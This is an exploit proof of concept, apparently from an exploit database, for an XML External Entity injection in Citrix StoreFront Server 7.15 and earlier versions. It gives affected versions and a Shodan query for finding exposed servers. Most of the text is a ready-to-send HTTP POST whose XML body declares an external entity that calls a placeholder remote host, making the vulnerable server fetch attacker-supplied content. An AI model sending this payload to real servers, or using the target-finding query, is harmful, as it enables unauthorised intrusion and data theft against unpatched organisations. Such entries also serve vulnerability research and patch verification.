# Exploit Title: Citrix StoreFront Server 7.15 - XML External Entity Injection
# Date: 2019-08-28
# Exploit Author: Vahagn Vardanya
# Vendor Homepage:https://www.citrix.com/downloads/storefront/
# Software Link: https://support.citrix.com/article/CTX251988
# Version:
# Citrix StoreFront Server  earlier than 1903
# Citrix StoreFront Server 7.15 LTSR earlier than CU4 (3.12.4000)
# Citrix StoreFront Server 7.6 LTSR earlier than CU8 (3.0.8000)#
# Tested on: Windows
# Shodan query https://www.shodan.io/search?query=%2FCitrix%2FStoreWeb

# PoC

POST /Citrix/StoreAuth/ExplicitForms/Start HTTP/1.1
Content-Type: application/vnd.citrix.requesttoken+xml
Accept: application/vnd.citrix.requesttokenresponse+xml, application/vnd.
citrix.authenticateresponse-1+xml
Accept-Language:ru,en-US;q=0.9,en;q=0.8,fr;q=0.7,hy;q=0.6,de;q=0.5,es;q=0.4,nb;q=0.3,nl;q=0.2,fi;q=0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36
X-Forwarded-For: 192.168.204.1
X-Citrix-Agent: crm.
X-Citrix-AM-CredentialTypes: none, username, domain, password, newpassword,passcode, savecredentials, textcredential, webview, webview
X-Citrix-AM-LabelTypes: none, plain, heading, information, warning, error,confirmation, image
X-Citrix-IsUsingHTTPS: No
Host: 192.168.204.131
Content-Length: 331
Expect: 100-continue

<?xml version="1.0" encoding="utf-8" standalone='no'?><!DOCTYPE
requesttoken [<!ENTITY % xxe SYSTEM "http://REMOTE">%xxe; ]><requesttoken
xmlns="http://citrix.com/delivery-services/1-0/auth/requesttoken
"><for-service>a</for-service><for-service-url>http://secure-web.cisco.com/
<http://secure-web.cisco.com/1ijL9Cycthe9FsmytQkHCl1Xg9pMufEcuz0PmzFHVwkbFjSep42bW3GRBkLUxePJTdOcYeHl5hlVi95aQc-F0KUuqpBKFdx4EXJ_ppx3MY000cALA2hGugGjMX3hbmvhtPOTba7B4LnAcpuyFDLHiSlv8xyu_CzN0mhekRY51L34p4Wy9oMguR9Bj8YWAm6KxixMl1DiaZ88h4FVR0vKzHdtedNF63xO329dQAtQuVWiipK_rt4rnVWKmorTTrbp-bsdV7zUBsqjON-MZYpzagQ/http%3A%2F%2F192.168.204.146%2FCitrix%2Fstore_nameAuth%2Fauth%2Fv1%2Ftoken></for-service-url><reqtokentemplate
/><requested-lifetime>0.08:00:00</requested-lifetime></requesttoken>
